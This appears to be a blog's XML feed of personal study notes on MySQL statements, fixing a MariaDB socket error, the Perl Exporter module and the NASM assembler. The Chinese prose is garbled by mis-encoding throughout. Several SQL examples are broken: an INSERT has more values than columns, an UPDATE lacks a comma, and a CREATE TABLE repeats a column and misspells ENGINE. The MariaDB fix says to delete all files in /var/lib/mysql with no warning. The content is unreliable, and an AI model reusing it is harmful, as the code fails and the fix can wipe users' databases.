class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Customers(cust_name,<br>    cust_address,<br>    cust_city,<br>    cust_state,<br>    cust_zip,<br>    cust_country,<br>    cust_contact,<br>    cust_email)<br><span class="hljs-keyword">VALUES</span>(<span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-string">&#x27;Pep E. LaPew&#x27;</span>,<br>    <span class="hljs-string">&#x27;100 Main Street&#x27;</span>,<br>    <span class="hljs-string">&#x27;Los Angeles&#x27;</span>, <br>    <span class="hljs-string">&#x27;CA&#x27;</span>, <br>    <span class="hljs-string">&#x27;90046&#x27;</span>,<br>    <span class="hljs-string">&#x27;USA&#x27;</span>,<br>    <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">NULL</span>),<br>    (<span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-string">&#x27;Pep E. LaPew&#x27;</span>,<br>    <span class="hljs-string">&#x27;100 Main Street&#x27;</span>,<br>    <span class="hljs-string">&#x27;Los Angeles&#x27;</span>, <br>    <span class="hljs-string">&#x27;CA&#x27;</span>, <br>    <span class="hljs-string">&#x27;90046&#x27;</span>,<br>    <span class="hljs-string">&#x27;USA&#x27;</span>,<br>    <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">NULL</span><br>    );<br><br></code></pre></td></tr></table></figure><h2 id="19-4-æ’å…¥æ£€ç´¢å‡ºçš„æ•°æ®"><a href="#19-4-æ’å…¥æ£€ç´¢å‡ºçš„æ•°æ®" class="headerlink" title="19.4 æ’å…¥æ£€ç´¢å‡ºçš„æ•°æ®"></a>19.4 æ’å…¥æ£€ç´¢å‡ºçš„æ•°æ®</h2><p>å³å°†ä¸€æ¡ <code>SELECT</code> è¯­å¥çš„ç»“æœæ’å…¥è¡¨ä¸­.</p><p>å¦‚, å°† <code>custnew</code> è¡¨ä¸­çš„å†…å®¹æ’å…¥ <code>customers</code> è¡¨.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> customers(cust_id,<br>    cust_contact,<br>    cust_email,<br>    cust_name,<br>    cust_address,<br>    cust_city,<br>    cust_state,<br>    cust_zip,<br>    cust_country)<br><span class="hljs-keyword">SELECT</span> cust_id,<br>    cust_contact,<br>    cust_email,<br>    cust_name,<br>    cust_address,<br>    cust_city,<br>    cust_state,<br>    cust_zip,<br>    cust_country<br><span class="hljs-keyword">FROM</span> custnew;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯åŒ…å« <code>WHERE</code> å­å¥æ¥è¿‡æ»¤.</p><h1 id="ç¬¬20ç« -æ›´æ–°å’Œåˆ é™¤æ•°æ®"><a href="#ç¬¬20ç« -æ›´æ–°å’Œåˆ é™¤æ•°æ®" class="headerlink" title="ç¬¬20ç«  æ›´æ–°å’Œåˆ é™¤æ•°æ®"></a>ç¬¬20ç«  æ›´æ–°å’Œåˆ é™¤æ•°æ®</h1><h2 id="20-1-æ›´æ–°æ•°æ®"><a href="#20-1-æ›´æ–°æ•°æ®" class="headerlink" title="20.1 æ›´æ–°æ•°æ®"></a>20.1 æ›´æ–°æ•°æ®</h2><p><code>UPDATE</code> è¯­å¥ç”± 3 éƒ¨åˆ†ç»„æˆ:</p><ul><li>è¦æ›´æ–°çš„è¡¨</li><li>åˆ—åå’Œå®ƒä»¬çš„æ–°å€¼</li><li>ç¡®å®šè¦æ›´æ–°è¡Œçš„è¿‡æ»¤æ¡ä»¶</li></ul><p><code>SET</code> å‘½ä»¤ç”¨æ¥å°†æ–°å€¼èµ‹ç»™è¢«æ›´æ–°çš„åˆ—.</p><p>å¦‚:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> customers<br><span class="hljs-keyword">SET</span> cust_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;The Fudds&#x27;</span><br>    cust_email <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;elmer@fudd.com&#x27;</span><br><span class="hljs-keyword">WHERE</span> cust_id <span class="hljs-operator">=</span> <span class="hljs-number">10005</span>;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ <code>WHERE</code> çš„ä½¿ç”¨, å¦‚æœæ²¡æœ‰ <code>WHERE</code> åˆ™ä¼šæ›´æ–°æ‰€æœ‰è¡Œ.</p><p>å³ä½¿æ˜¯å‘ç”Ÿé”™è¯¯, ä¹Ÿç»§ç»­è¿›è¡Œæ›´æ–°, ä½¿ç”¨ <code>IGNORE</code> å…³é”®å­—. å¦‚ <code>UPDATE IGNORE customers...</code></p><h2 id="20-2-åˆ é™¤æ•°æ®"><a href="#20-2-åˆ é™¤æ•°æ®" class="headerlink" title="20.2 åˆ é™¤æ•°æ®"></a>20.2 åˆ é™¤æ•°æ®</h2><p><code>DELETE</code>.</p><p>å¦‚:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> customers<br><span class="hljs-keyword">WHERE</span> cust_id <span class="hljs-operator">=</span> <span class="hljs-number">10006</span>;<br></code></pre></td></tr></table></figure><p><code>DELETE</code> ä¸éœ€è¦åˆ—å, <code>DELETE</code> åˆ é™¤æ•´è¡Œè€Œä¸åˆ é™¤åˆ—, ä¸ºäº†åˆ é™¤æŒ‡å®šçš„åˆ—, ä½¿ç”¨ <code>UPDATE</code> è¯­å¥. </p><p>MySQL æ²¡æœ‰æ’¤é”€ (undo).</p><h1 id="ç¬¬21ç« -åˆ›å»ºå’Œæ“çºµè¡¨"><a href="#ç¬¬21ç« -åˆ›å»ºå’Œæ“çºµè¡¨" class="headerlink" title="ç¬¬21ç«  åˆ›å»ºå’Œæ“çºµè¡¨"></a>ç¬¬21ç«  åˆ›å»ºå’Œæ“çºµè¡¨</h1><p>ä¸¤ç§åˆ›å»ºè¡¨çš„æ–¹æ³•:</p><ul><li>äº¤äº’å¼åˆ›å»ºå’Œç®¡ç†è¡¨çš„å·¥å…·</li><li>MySQL è¯­å¥æ“çºµ (<code>CREATE TABLE</code> è¯­å¥)</li></ul><h3 id="21-1-1-è¡¨åˆ›å»ºåŸºç¡€"><a href="#21-1-1-è¡¨åˆ›å»ºåŸºç¡€" class="headerlink" title="21.1.1 è¡¨åˆ›å»ºåŸºç¡€"></a>21.1.1 è¡¨åˆ›å»ºåŸºç¡€</h3><p><code>CREATE TABLE</code> éœ€è¦çš„ä¿¡æ¯:</p><ul><li>è¡¨çš„åå­—</li><li>åˆ—çš„åå­—å’Œå®šä¹‰, ç”¨ <code>,</code> åˆ†éš”</li></ul><p>å¦‚:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> productnotes<br>(<br>    note_id     <span class="hljs-type">int</span>          <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>    prod_id     <span class="hljs-type">char</span>(<span class="hljs-number">10</span>)     <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    note_date   datetime     <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    note_id     text         <span class="hljs-keyword">NULL</span>,<br>    <span class="hljs-keyword">PRIMARY</span> KEY(note_id),<br>    FULLTEXT(note_text)<br>) ENGING<span class="hljs-operator">=</span>MyISAM;<br></code></pre></td></tr></table></figure><p><code>PRIMARY KEY</code> æŒ‡å®šä¸»é”®.</p><p>å¦‚æœä»…æƒ³åœ¨ä¸€ä¸ªè¡¨ä¸å­˜åœ¨æ—¶åˆ›å»º, åº”è¯¥åœ¨è¡¨åä¹‹åç»™å‡º <code>IF NOT EXISTS</code>.</p><h3 id="21-1-2-ä½¿ç”¨-NULL-å€¼"><a href="#21-1-2-ä½¿ç”¨-NULL-å€¼" class="headerlink" title="21.1.2 ä½¿ç”¨ NULL å€¼"></a>21.1.2 ä½¿ç”¨ NULL å€¼</h3><p>åˆ›å»ºè¡¨æ—¶æŒ‡å®š <code>NULL</code> æˆ– <code>NOT NULL</code>:</p><ul><li>å…è®¸ <code>NULL</code> å€¼çš„åˆ—ä¹Ÿå…è®¸åœ¨æ’å…¥è¡Œæ—¶ä¸ç»™å‡ºè¯¥åˆ—çš„å€¼.</li><li>ä¸å…è®¸ <code>NULL</code> å€¼çš„åˆ—ä¸å…è®¸åœ¨æ’å…¥è¡Œæ—¶ä¸ç»™å‡ºè¯¥åˆ—çš„å€¼.</li></ul><h3 id="21-1-3-ä¸»é”®å†ä»‹ç»"><a href="#21-1-3-ä¸»é”®å†ä»‹ç»" class="headerlink" title="21.1.3 ä¸»é”®å†ä»‹ç»"></a>21.1.3 ä¸»é”®å†ä»‹ç»</h3><p><mark>ä¸»é”®</mark> æ˜¯ç”¨æ¥å”¯ä¸€æ ‡è¯†æŸä¸€è¡Œç”¨çš„. è¡¨ä¸­çš„æ¯ä¸€è¡Œå¿…é¡»å…·æœ‰å”¯ä¸€çš„ä¸»é”®å€¼.</p><p>ä¹Ÿå¯ä»¥<mark>æŒ‡å®šå¤šä¸ªåˆ—</mark>ç»„æˆä¸»é”®:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> productnotes<br>(<br>    note_id     <span class="hljs-type">int</span>          <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,<br>    prod_id     <span class="hljs-type">char</span>(<span class="hljs-number">10</span>)     <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    note_date   datetime     <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>    note_id     text         <span class="hljs-keyword">NULL</span>,<br><br>    <span class="hljs-keyword">PRIMARY</span> KEY(note_id, prod_id),<br>    FULLTEXT(note_text)<br>)   ENGING<span class="hljs-operator">=</span>MyISAM;<br><br></code></pre></td></tr></table></figure><p>ä¸»é”®ä¹Ÿå¯ä»¥åˆ›å»ºè¡¨ä¹‹åå®šä¹‰.</p><h3 id="21-1-4-ä½¿ç”¨-AUTO-INCREMENT"><a href="#21-1-4-ä½¿ç”¨-AUTO-INCREMENT" class="headerlink" title="21.1.4 ä½¿ç”¨ AUTO_INCREMENT"></a>21.1.4 ä½¿ç”¨ <code>AUTO_INCREMENT</code></h3><p><code>AUTO_INCREMENT</code> å‘Šè¯‰ MySQL, æœ¬åˆ—æ¯å¢åŠ ä¸€è¡Œæ—¶è‡ªåŠ¨å¢é‡. (å³, æ¯æ¬¡æ‰§è¡Œä¸€ä¸ª <code>INSERT</code> æ“ä½œ, MySQL è‡ªåŠ¨å¯¹è¯¥åˆ—å¢é‡)</p><p><mark>æ³¨æ„</mark> æ¯ä¸ªè¡¨å€¼å…è®¸ä¸€ä¸ª <code>AUTO_INCREMENT</code> åˆ—.</p><p>å¯ä»¥æŒ‡å®šå€¼æ¥æ›¿ä»£è‡ªåŠ¨ç”Ÿæˆçš„å€¼.</p><p><code>SELECT last_insert_id()</code> å¯è¿”å›æœ€åä¸€ä¸ª <code>AUTO_INCREMENT</code> å€¼.</p><h3 id="21-1-5-æŒ‡å®šé»˜è®¤å€¼"><a href="#21-1-5-æŒ‡å®šé»˜è®¤å€¼" class="headerlink" title="21.1.5 æŒ‡å®šé»˜è®¤å€¼"></a>21.1.5 æŒ‡å®šé»˜è®¤å€¼</h3>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³å¯åŠ¨-mysql-æ—¶-can-not-connect-to-local-mysql-server-through-socket-é—®é¢˜</title>
    <link href="/2022/12/24/%E8%A7%A3%E5%86%B3%E5%90%AF%E5%8A%A8-mysql-%E6%97%B6-can-not-connect-to-local-mysql-server-through-socket-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/12/24/%E8%A7%A3%E5%86%B3%E5%90%AF%E5%8A%A8-mysql-%E6%97%B6-can-not-connect-to-local-mysql-server-through-socket-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ1-Archlinux-ä¸Šçš„-mysql-é»˜è®¤å®ç°"><a href="#å‚è€ƒ1-Archlinux-ä¸Šçš„-mysql-é»˜è®¤å®ç°" class="headerlink" title="å‚è€ƒ1 Archlinux ä¸Šçš„ mysql é»˜è®¤å®ç°"></a><a href="https://stackoverflow.com/questions/52357383/cant-connect-to-local-mysql-server-through-socket-run-mysqld-mysqld-sock-2">å‚è€ƒ1 Archlinux ä¸Šçš„ mysql é»˜è®¤å®ç°</a></h1><p><a href="https://wiki.archlinuxcn.org/wiki/MariaDB">ArchWiki å…³äº MariaDB ç•Œé¢</a></p><p>MariaDB è¢« Arch Linux å½“ä½œå®˜æ–¹é»˜è®¤çš„ MySQL å®ç°.</p><h1 id="è§£å†³æŠ¥é”™"><a href="#è§£å†³æŠ¥é”™" class="headerlink" title="è§£å†³æŠ¥é”™"></a><a href="https://linuxways.net/centos/troubleshoot-error-job-for-mariadb-service-failed-because-the-control-process-exited-with-error-code/">è§£å†³æŠ¥é”™</a></h1><p>ä¸»è¦æ˜¯åˆ é™¤ <code>/var/lib/mysql</code> ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶.</p><p>ä¹‹å:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo systemctl start mariadb<br>$ sudo systemctl <span class="hljs-built_in">enable</span> mariadb<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-Exporter-æ¨¡å—</title>
    <link href="/2022/12/19/%E5%85%B3%E4%BA%8E-Perl-Exporter-%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/12/19/%E5%85%B3%E4%BA%8E-Perl-Exporter-%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>ä¸¤ä¸ªå…¨å±€å˜é‡ <code>EXPORT</code> å’Œ <code>EXPORT_OK</code>.</p><p>åœ¨ç”¨ <code>use MODULE</code>, åé¢æ²¡æœ‰è·Ÿåˆ—è¡¨æ—¶, ä¼šè‡ªåŠ¨å¯¼å…¥ <code>EXPORT</code> ä¸­çš„åˆ°å½“å‰ namespace.</p><p>è‹¥æœ‰åˆ—è¡¨ <code>use MODULE list</code>, åˆ™ä¸ä¼šè‡ªåŠ¨å¯¼å…¥ <code>EXPORT</code> ä¸­çš„. <code>list</code> ä¸­å¯ä»¥æŒ‡å®š <code>EXPORT</code> å’Œ <code>EXPORT_OK</code> ä¸­çš„å†…å®¹.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>perl-çš„ç±»å‹å›¢</title>
    <link href="/2022/12/18/perl-%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%9B%A2/"/>
    <url>/2022/12/18/perl-%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%9B%A2/</url>
    
    <content type="html"><![CDATA[<p>éœ€è¦ç”¨ <code>our</code> æ¥å£°æ˜ç›¸å…³å˜é‡.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NASM-ä¸­æ–‡æ‰‹å†Œæ‘˜å½•ç¬”è®°</title>
    <link href="/2022/12/17/NASM-%E4%B8%AD%E6%96%87%E6%89%8B%E5%86%8C%E6%91%98%E5%BD%95%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/12/17/NASM-%E4%B8%AD%E6%96%87%E6%89%8B%E5%86%8C%E6%91%98%E5%BD%95%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬äºŒç« -è¿è¡Œ-NASM"><a href="#ç¬¬äºŒç« -è¿è¡Œ-NASM" class="headerlink" title="ç¬¬äºŒç«  è¿è¡Œ NASM"></a>ç¬¬äºŒç«  è¿è¡Œ NASM</h1><p>NASM åœ¨ç¢°åˆ°é”™è¯¯ä»¥å‰æ˜¯ä¸è¾“å‡ºä»»ä½•ä¿¡æ¯çš„, æ‰€ä»¥é™¤äº†å‡ºé”™ä¿¡æ¯ä½ çœ‹ä¸åˆ°å…¶ä»–ä¿¡æ¯.</p><p>æ‰€æœ‰å¯ç”¨çš„è¾“å‡ºæ–‡ä»¶æ ¼å¼çš„åˆ—è¡¨å¯ä»¥é€šè¿‡:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nasm -hf<br></code></pre></td></tr></table></figure><p>å¾—åˆ°.</p><p><code>-l</code> é€‰é¡¹ä¼šç”Ÿæˆä¸€ä¸ªæºæ–‡ä»¶çš„åˆ—è¡¨æ–‡ä»¶, åœ¨é‡Œé¢, åœ°å€å’Œäº§ç”Ÿçš„ä»£ç åˆ—åœ¨å·¦è¾¹, å®é™…çš„æºä»£ç  (åŒ…æ‹¬å®æ‰©å±•, é™¤äº†é‚£äº›æŒ‡å®šä¸éœ€è¦åœ¨åˆ—è¡¨ä¸­æ‰©å±•çš„å®) åˆ—åœ¨å³è¾¹. å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nasm -f elf myfile.asm -l myfile.lst<br></code></pre></td></tr></table></figure><p><code>-F</code> ä¸ºè¾“å‡ºæ–‡ä»¶é€‰æ‹©ä¸€ä¸ªè°ƒè¯•æ ¼å¼. <code>-g</code> ä½¿è°ƒè¯•ä¿¡æ¯æœ‰æ•ˆ.</p><p><code>-I</code> åŒ…å«æ–‡ä»¶æœç´¢è·¯å¾„.</p><p><code>NASMENV</code> ç¯å¢ƒå˜é‡çš„å€¼ä¼šä½œä¸ºå‘½ä»¤è¡Œçš„é™„åŠ é€‰é¡¹éƒ¨åˆ†, å…¶å€¼é€šè¿‡ç©ºæ ¼ç¬¦åˆ†éš”. è‹¥ä¸æƒ³ç”¨ç©ºæ ¼ç¬¦åˆ†éš”, å¯å°†å…¶å€¼ä»¥é <code>-</code> å¼€å¤´ä½œä¸ºæ–°çš„åˆ†éš”ç¬¦, å¦‚:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">NASMENV</span>=<span class="hljs-string">&#x27;!-dNAME=&quot;my name&quot;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-2-3-NASM-ä¸å­˜å‚¨å˜é‡ç±»å‹"><a href="#2-2-3-NASM-ä¸å­˜å‚¨å˜é‡ç±»å‹" class="headerlink" title="2.2.3 NASM ä¸å­˜å‚¨å˜é‡ç±»å‹"></a>2.2.3 NASM ä¸å­˜å‚¨å˜é‡ç±»å‹</h3><p>å› æ­¤åœ¨ä½¿ç”¨æ—¶æ˜¾ç¤ºè¡¨æ˜ç±»å‹:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">mov</span> word [<span class="hljs-keyword">var</span>],2<br></code></pre></td></tr></table></figure><h1 id="ç¬¬ä¸‰ç« -NASM-è¯­è¨€"><a href="#ç¬¬ä¸‰ç« -NASM-è¯­è¨€" class="headerlink" title="ç¬¬ä¸‰ç«  NASM è¯­è¨€"></a>ç¬¬ä¸‰ç«  NASM è¯­è¨€</h1><p>æ¯ä¸€è¡Œ NASM æºä»£ç åŒ…å« (é™¤éæ˜¯ä¸€ä¸ªå®, ä¸€ä¸ªé¢„å¤„ç†æ“ä½œç¬¦, æˆ–ä¸€ä¸ªæ±‡ç¼–å™¨æ“ä½œç¬¦) ä¸‹é¢å››ä¸ªéƒ¨åˆ†çš„å…¨éƒ¨æˆ–æŸå‡ ä¸ªéƒ¨åˆ†:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">label</span>:  instruction operands    ; comment<br></code></pre></td></tr></table></figure><p>NASM ä½¿ç”¨åæ–œçº¿ <code>\</code> ä½œä¸º <mark>ç»­è¡Œç¬¦</mark> .</p><p><mark>labels</mark> ä¸­çš„æœ‰æ•ˆå­—ç¬¦æ˜¯:</p><ul><li>å­—æ¯</li><li>æ•°å­—</li><li>â€˜-â€˜, â€˜$â€™, â€˜#â€™, â€˜@â€™, â€˜~â€™, â€˜.â€™, â€˜?â€™</li></ul><p>åªæœ‰ â€˜.â€™, â€˜_â€˜, â€˜?â€™ å¯ä»¥ä½œä¸ºæ ‡è¯†ç¬¦å¼€å¤´.</p><p>ä¸€ä¸ªæ ‡è¯†ç¬¦è¿˜å¯ä»¥åŠ ä¸Šä¸€ä¸ª â€˜$â€™ å‰ç¼€, ä»¥è¡¨æ˜å®ƒä½œä¸ºä¸€ä¸ªæ ‡è¯†ç¬¦è€Œä¸æ˜¯ä¿ç•™å­—æ¥å¤„ç†.</p><h2 id="3-2-ä¼ªæŒ‡ä»¤"><a href="#3-2-ä¼ªæŒ‡ä»¤" class="headerlink" title="3.2 ä¼ªæŒ‡ä»¤"></a>3.2 ä¼ªæŒ‡ä»¤</h2><p>ä¼ªæŒ‡ä»¤æ˜¯ä¸€äº›å¹¶ä¸æ˜¯çœŸæ­£çš„ x86 æœºå™¨æŒ‡ä»¤, ä½†è¿˜æ˜¯è¢«ç”¨åœ¨äº† instruction åŸŸä¸­çš„æŒ‡ä»¤.</p><p><code>db</code>, <code>dd</code>, <code>dw</code> çš„åŒºåˆ«æ˜¯å¯¹é½è§„åˆ™ä¸åŒ.</p><p><code>RESB</code> ç­‰ç”¨æ¥å£°æ˜æœªåˆå§‹åŒ–çš„å­˜å‚¨ç©ºé—´:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">buffer</span>:     resb   <span class="hljs-number">64</span>       ; reserve <span class="hljs-number">64</span> bytes<br></code></pre></td></tr></table></figure><p><code>EQU</code> çš„è¡Œä¸ºå°±æ˜¯æŠŠç»™å‡ºçš„ label çš„åå­—å®šä¹‰æˆå®ƒçš„æ“ä½œæ•° (å”¯ä¸€) çš„å€¼, å®šä¹‰æ˜¯ä¸å¯æ›´æ”¹çš„:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msglen</span>      equ     <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="3-2-5-TIMES-é‡å¤æŒ‡ä»¤æˆ–æ•°æ®"><a href="#3-2-5-TIMES-é‡å¤æŒ‡ä»¤æˆ–æ•°æ®" class="headerlink" title="3.2.5 TIMES: é‡å¤æŒ‡ä»¤æˆ–æ•°æ®"></a>3.2.5 <code>TIMES</code>: é‡å¤æŒ‡ä»¤æˆ–æ•°æ®</h3><p>å‰ç¼€ <code>TIMES</code> å¯¼è‡´æŒ‡ä»¤è¢«æ±‡ç¼–å¤šæ¬¡.</p><h2 id="3-3-æœ‰æ•ˆåœ°å€"><a href="#3-3-æœ‰æ•ˆåœ°å€" class="headerlink" title="3.3 æœ‰æ•ˆåœ°å€"></a>3.3 æœ‰æ•ˆåœ°å€</h2><p>ä»¥ä¸‹ä¹Ÿæœ‰æ•ˆ:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,[<span class="hljs-built_in">ebx</span>*<span class="hljs-number">2</span>+<span class="hljs-built_in">ecx</span>+offset]<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,[<span class="hljs-built_in">bp</span>+<span class="hljs-built_in">di</span>+<span class="hljs-number">8</span>]<br></code></pre></td></tr></table></figure><h2 id="3-4-å¸¸æ•°"><a href="#3-4-å¸¸æ•°" class="headerlink" title="3.4 å¸¸æ•°"></a>3.4 å¸¸æ•°</h2><p>NASM èƒ½ç†è§£å››ç§ä¸åŒç±»å‹çš„å¸¸æ•°:</p><ul><li>æ•°å€¼</li><li>å­—ç¬¦</li><li>å­—ç¬¦ä¸²</li><li>æµ®ç‚¹æ•°</li></ul><h2 id="3-5-è¡¨è¾¾å¼"><a href="#3-5-è¡¨è¾¾å¼" class="headerlink" title="3.5 è¡¨è¾¾å¼"></a>3.5 è¡¨è¾¾å¼</h2><p><code>jmp $</code> å¯ä»¥ç®€å•è¡¨ç¤ºæ— é™å¾ªç¯.</p><p><code>%</code> ç¬¦å·è¢«å®é¢„å¤„ç†å™¨ä½¿ç”¨.</p><h2 id="3-6-SEG-å’Œ-WRT"><a href="#3-6-SEG-å’Œ-WRT" class="headerlink" title="3.6 SEG å’Œ WRT"></a>3.6 <code>SEG</code> å’Œ <code>WRT</code></h2><p><code>SRG</code> æ“ä½œç¬¦è¿”å›ç¬¦å·æ‰€åœ¨çš„é¦–é€‰æ®µçš„æ®µåŸºå€:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-built_in">seg</span> symbol<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">es</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,symbol<br></code></pre></td></tr></table></figure><h2 id="3-9-æœ¬åœ°-Labels"><a href="#3-9-æœ¬åœ°-Labels" class="headerlink" title="3.9 æœ¬åœ° Labels"></a>3.9 æœ¬åœ° Labels</h2><p>NASM å¯¹äºé‚£äº›ä»¥ä¸€ä¸ªå¥ç‚¹å¼€å§‹çš„ç¬¦å·ä¼šä½œç‰¹æ®Šå¤„ç†, ä¸€ä¸ªä»¥å•ä¸ªå¥ç‚¹å¼€å§‹çš„ Label ä¼šè¢«å¤„ç†æˆæœ¬åœ° label, è¿™æ„å‘³ç€å®ƒä¼šè·Ÿå‰é¢ä¸€ä¸ªéæœ¬åœ° label ç›¸å…³è”. æ„Ÿè§‰åƒæ˜¯å­ label:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ada">label1  ; <span class="hljs-keyword">some</span> code<br><br>.<span class="hljs-keyword">loop</span>   ; <br>        ; <span class="hljs-keyword">some</span> code<br>        jne .<span class="hljs-keyword">loop</span><br>        ret<br><br>label2  ; <span class="hljs-keyword">some</span> code<br><br>.<span class="hljs-keyword">loop</span>   ;<br>        jne code<br>        ret<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª <code>.loop</code> å®é™…ä¸Šè¢«å®šä¹‰ä¸º <code>label1.loop</code>.</p><p>ç¬¬äºŒä¸ª <code>.loop</code> å®é™…ä¸Šè¢«å®šä¹‰ä¸º <code>label2.loop</code></p><p>NASM è¿˜èƒ½å®šä¹‰å…¶ä»–çš„ç‰¹æ®Šç¬¦å·, æ¯”å¦‚ä»¥ä¸¤ä¸ªå¥ç‚¹å¼€å§‹çš„ç¬¦å·, å¦‚ <code>..start</code> è¢«ç”¨æ¥æŒ‡å®š <code>.obj</code> è¾“å‡ºæ–‡ä»¶çš„æ‰§è¡Œå…¥å£.</p><h1 id="ç¬¬å››ç« 